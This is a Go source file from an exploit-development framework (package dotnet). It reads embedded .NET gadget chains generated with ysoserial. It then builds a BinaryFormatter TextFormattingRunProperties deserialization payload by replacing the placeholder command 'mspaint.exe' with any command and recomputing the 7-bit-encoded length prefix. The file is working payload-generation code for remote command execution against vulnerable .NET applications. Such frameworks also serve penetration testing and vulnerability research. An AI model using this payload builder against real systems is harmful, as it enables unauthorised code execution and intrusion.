package dotnet

import (
	"bytes"
	"embed"
	"fmt"
	"path/filepath"

	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/transform"
)

//go:embed data
var data embed.FS

// ReadGadget reads a gadget chain file by gadget name and formatter.
func ReadGadget(gadgetName, formatter string) ([]byte, error) {
	gadget, err := data.ReadFile(filepath.Join("data", formatter, gadgetName+".bin"))
	if err != nil {
		return nil, fmt.Errorf("dotnet.ReadGadget: %w", err)
	}

	return gadget, nil
}

// https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/10b218f5-9b2b-4947-b4b7-07725a2c8127
// https://referencesource.microsoft.com/#mscorlib/system/io/binarywriter.cs,2daa1d14ff1877bd
func Write7BitEncodedInt(value int) []byte {
	var (
		bs []byte
		v  = uint(value)
	)

	for v >= 0x80 {
		bs = append(bs, byte(v|0x80))
		v >>= 7
	}

	bs = append(bs, byte(v))

	return bs
}

// TextFormattingRunPropertiesBinaryFormatter serializes a TextFormattingRunProperties gadget chain using the BinaryFormatter formatter.
func TextFormattingRunPropertiesBinaryFormatter(cmd string) string {
	// ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c mspaint.exe
	gadget, err := ReadGadget("TextFormattingRunProperties", "BinaryFormatter")
	if err != nil {
		output.PrintFrameworkError(err.Error())

		return ""
	}

	const (
		xmlLen7Bit = "\xba\x05"
		xmlLenBase = 687
	)

	// Replace length-prefixed placeholder command with supplied command
	escapedCmd := transform.EscapeXML(cmd)
	gadget = bytes.Replace(gadget, []byte("mspaint.exe"), []byte(escapedCmd), 1)
	gadget = bytes.Replace(gadget, []byte(xmlLen7Bit), Write7BitEncodedInt(xmlLenBase+len(escapedCmd)), 1)

	return string(gadget)
}
